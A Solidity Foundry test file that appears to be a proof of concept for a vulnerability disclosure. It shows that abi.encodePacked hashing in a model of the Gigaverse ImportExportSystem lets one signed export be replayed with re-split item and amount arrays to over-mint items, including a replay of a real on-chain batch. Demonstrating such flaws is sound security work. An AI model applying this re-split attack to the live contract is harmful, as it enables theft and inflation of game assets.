// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {ImportExportModel, MockGameItems} from "../src/ImportExportModel.sol";

/// @notice Proves the Gigaverse ImportExportSystem `abi.encodePacked(itemIds, itemAmounts)` signature
///  collision with NUMBERS: ONE backend-signed export authorization is replayable by the player with a
///  DIFFERENT (itemIds, itemAmounts) array split that produces the SAME digest -> the same signature
///  verifies -> the export mints the attacker's chosen split -> massive item over-mint.
contract CollisionPoC is Test {
    ImportExportModel m;
    MockGameItems items;
    uint256 internal signerPk = 0xA11CE;
    address internal signer;
    address internal player = address(0xBEEF);

    function setUp() public {
        signer = vm.addr(signerPk);
        items = new MockGameItems();
        m = new ImportExportModel(signer, items);
    }

    function _sign(bytes32 ethHash) internal view returns (bytes memory) {
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, ethHash);
        return abi.encodePacked(r, s, v);
    }

    function test_EncodePackedCollision_OverMint() public {
        uint256 nonce = 1;

        // ---- BACKEND intends: give the player 5 of item #100 and 3 of item #717. It signs THAT split. ----
        uint256[] memory idsLegit = new uint256[](2);
        idsLegit[0] = 100; idsLegit[1] = 717;
        uint256[] memory amtLegit = new uint256[](2);
        amtLegit[0] = 5;   amtLegit[1] = 3;

        // ---- ATTACKER re-partition: itemIds=[100], itemAmounts=[717, 5, 3] (same word sequence, shifted boundary). ----
        uint256[] memory idsAtk = new uint256[](1);
        idsAtk[0] = 100;
        uint256[] memory amtAtk = new uint256[](3);
        amtAtk[0] = 717; amtAtk[1] = 5; amtAtk[2] = 3;

        // CORE COLLISION: the two different splits hash to the SAME digest.
        bytes32 dLegit = m.digest(player, idsLegit, amtLegit, nonce);
        bytes32 dAtk   = m.digest(player, idsAtk,   amtAtk,   nonce);
        assertEq(dLegit, dAtk, "encodePacked digests collide across the array-boundary re-split");

        // The signer signs the INTENDED (legit) split only.
        bytes memory sig = _sign(dLegit);

        // The attacker submits the RE-SPLIT version with that same signature -> it verifies (same digest).
        m.exportItemsFromGame(player, idsAtk, amtAtk, nonce, sig);

        // The loop ran once (ids.length==1): mint(player, ids[0]=100, amts[0]=717) -> 717 units of item #100.
        uint256 got100 = items.balanceOf(player, 100);
        uint256 got717 = items.balanceOf(player, 717);
        console2.log("item #100 minted (intended 5):", got100);
        console2.log("item #717 minted (intended 3):", got717);

        assertEq(got100, 717, "attacker minted 717 of item #100 instead of the intended 5 (143x over-mint)");
        assertEq(got717, 0,   "the intended 3 of item #717 were never minted -- the split was subverted");
    }

    /// REAL on-chain batch (export tx 0x842f79... : ids=[4,21,76,83,7], amts=[72,19,18,3,33]).
    /// Confirms the gate (signer DID sign a len-5 batch) and the HONEST bounded impact: the attacker can only
    /// re-shuffle the SIGNED words, concentrating the batch's largest word as the amount of a chosen item.
    function test_RealBatch_ReassignsAmounts() public {
        uint256 nonce = 7;
        uint256[] memory ids = new uint256[](5);
        ids[0]=4; ids[1]=21; ids[2]=76; ids[3]=83; ids[4]=7;
        uint256[] memory amt = new uint256[](5);
        amt[0]=72; amt[1]=19; amt[2]=18; amt[3]=3; amt[4]=33;
        bytes memory sig = _sign(m.digest(player, ids, amt, nonce));

        // ATTACK split: itemIds=[4,21,76,83], itemAmounts=[7,72,19,18,3,33] (shift boundary one word left).
        // Loop mints (4,7),(21,72),(76,19),(83,18) -> item #21 gets 72 (vs the intended 19, +279%).
        uint256[] memory idsAtk = new uint256[](4);
        idsAtk[0]=4; idsAtk[1]=21; idsAtk[2]=76; idsAtk[3]=83;
        uint256[] memory amtAtk = new uint256[](6);
        amtAtk[0]=7; amtAtk[1]=72; amtAtk[2]=19; amtAtk[3]=18; amtAtk[4]=3; amtAtk[5]=33;

        assertEq(m.digest(player, ids, amt, nonce), m.digest(player, idsAtk, amtAtk, nonce), "real-batch digests collide");
        m.exportItemsFromGame(player, idsAtk, amtAtk, nonce, sig);
        assertEq(items.balanceOf(player, 21), 72, "item #21 over-minted to 72 (intended 19) by re-aligning the batch's words");
        assertEq(items.balanceOf(player, 7),  0,  "item #7 dropped from the export");
    }

    /// Control: the legit split mints exactly what the backend intended (5 of #100, 3 of #717).
    function test_LegitSplit_MintsIntended() public {
        uint256 nonce = 2;
        uint256[] memory ids = new uint256[](2);
        ids[0] = 100; ids[1] = 717;
        uint256[] memory amt = new uint256[](2);
        amt[0] = 5;   amt[1] = 3;
        bytes memory sig = _sign(m.digest(player, ids, amt, nonce));
        m.exportItemsFromGame(player, ids, amt, nonce, sig);
        assertEq(items.balanceOf(player, 100), 5);
        assertEq(items.balanceOf(player, 717), 3);
    }
}
